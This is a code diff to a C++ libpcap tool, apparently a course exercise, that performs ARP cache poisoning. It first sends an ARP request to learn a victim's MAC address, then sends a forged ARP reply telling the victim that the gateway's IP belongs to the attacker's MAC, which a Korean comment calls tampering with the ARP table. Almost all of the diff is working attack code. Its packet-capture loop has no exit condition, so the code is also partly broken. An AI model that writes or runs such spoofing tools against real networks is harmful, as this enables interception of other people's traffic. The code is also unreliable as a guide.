@@ -23,6 +23,16 @@ typedef struct {
     char* ipAddress;
 } NetworkAddresses;
 
+void arp_reply_handler(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
+	PEthHdr eth_hdr = (PEthHdr)packet;
+    
+    // Ethernet 헤더의 type 필드를 확인하여 ARP 패킷인지 검사
+    if (eth_hdr->type() != EthHdr::Arp) return; // ARP 패킷이 아니면 리턴
+
+	std::string smacString = eth_hdr->smac();
+    std::strncpy((char*)user_data, smacString.c_str(), smacString.size() + 1); // +1 for null terminator
+}
+
 NetworkAddresses* getUserAddresses(const char* interface) {
     struct ifaddrs *ifaddr, *ifa;
     int family, s;
@@ -76,7 +86,7 @@ int main(int argc, char* argv[]) {
 			return -1;
 		}
 
-		// find my mac address
+		// find my mac address and ip
 		NetworkAddresses* addresses = getUserAddresses(dev);
 		
 		if(addresses->macAddress == nullptr){
@@ -89,9 +99,6 @@ int main(int argc, char* argv[]) {
 			return -1;
 		}
 
-		printf("%s\n",addresses->macAddress);
-		printf("%s\n",addresses->ipAddress);
-		
 		// set sender and
 		char* sender_ip = argv[i + 1]; // victim
 		char* target_ip = argv[i + 2]; // gateway
@@ -107,7 +114,7 @@ int main(int argc, char* argv[]) {
 		packet.arp_.pro_ = htons(EthHdr::Ip4);
 		packet.arp_.hln_ = Mac::SIZE;
 		packet.arp_.pln_ = Ip::SIZE;
-		packet.arp_.op_ = htons(ArpHdr::Reply);
+		packet.arp_.op_ = htons(ArpHdr::Request);
 		packet.arp_.smac_ = Mac(addresses->macAddress);
 		packet.arp_.sip_ = htonl(Ip(addresses->ipAddress));
 		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
@@ -118,9 +125,12 @@ int main(int argc, char* argv[]) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 		}
 
-		//reply
-		packet.eth_.dmac_ = Mac("f4:6a:dd:8b:3e:77");
-		packet.eth_.smac_ = Mac("00:0c:29:bb:e4:89");
+		char sender_mac[18];
+		pcap_loop(handle, -1, arp_reply_handler, (u_char*)sender_mac);
+
+		// ARP table 변조
+		packet.eth_.dmac_ = Mac(sender_mac);
+		packet.eth_.smac_ = Mac(addresses->macAddress);
 		packet.eth_.type_ = htons(EthHdr::Arp);
 
 		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -128,20 +138,22 @@ int main(int argc, char* argv[]) {
 		packet.arp_.hln_ = Mac::SIZE;
 		packet.arp_.pln_ = Ip::SIZE;
 		packet.arp_.op_ = htons(ArpHdr::Reply);
-		packet.arp_.smac_ = Mac("00:0c:29:bb:e4:89");
-		packet.arp_.sip_ = htonl(Ip("192.168.43.1"));
-		packet.arp_.tmac_ = Mac("f4:6a:dd:8b:3e:77");
-		packet.arp_.tip_ = htonl(Ip("192.168.43.200"));
+		packet.arp_.smac_ = Mac(addresses->macAddress);
+		packet.arp_.sip_ = htonl(Ip(target_ip));
+		packet.arp_.tmac_ = Mac(sender_mac);
+		packet.arp_.tip_ = htonl(Ip(sender_ip));
 
-		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 		if (res != 0) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 		}
 
 		pcap_close(handle);
 
-		// reply
-
 		i += 2;
+		free(addresses->macAddress);
+		free(addresses->ipAddress);
+		free(addresses);
 	}
+	return 0;
 }
